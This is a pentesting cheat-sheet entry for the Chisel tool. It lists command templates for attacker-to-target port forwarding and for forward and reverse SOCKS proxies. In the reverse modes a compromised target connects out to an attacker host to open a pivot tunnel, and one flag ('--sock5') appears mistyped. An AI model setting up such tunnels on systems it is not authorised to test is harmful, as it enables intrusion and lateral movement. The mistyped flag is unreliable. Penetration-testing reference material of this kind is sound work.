---
title: Chisel
desc: A fast TCP/UDP tunnel over HTTP.
tags: [Pivoting, PortForwarding]
alts: [Socat, Sshuttle]
website: https://github.com/jpillora/chisel
render_with_liquid: false
---

## Port Forwarding (Remote)

```sh
# On attack machine
chisel server -p <listen-port> --reverse &

# ------------------------------------------------

# On target machine
chisel client <attack-ip>:<listen-port> R:<local-port>:<target-ip>:<target-port> &
```

<br />

## Port Forwarding (Local)

```sh
# On target machine
chisel server -p <listen-port>

# -------------------------------------------------

# On attack machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
```

<br />

## Forward SOCKS Proxy

```sh
# On target machine
chisel server -p <listen-port> --sock5

# ----------------------------------------------

# On attack machine
chisel client <target-ip>:<listen-port> <proxy-port>:socks
```

<br />

## Reverse SOCKS Proxy

```sh
# On attack machine
chisel server -p <listen-port> --reverse &

# ------------------------------------------------

# On target machine
chisel client <attack-ip>:<listen-port> R:socks &

# ---------------------------------------------

# Stop connection
jobs
kill %<NUMBER>
```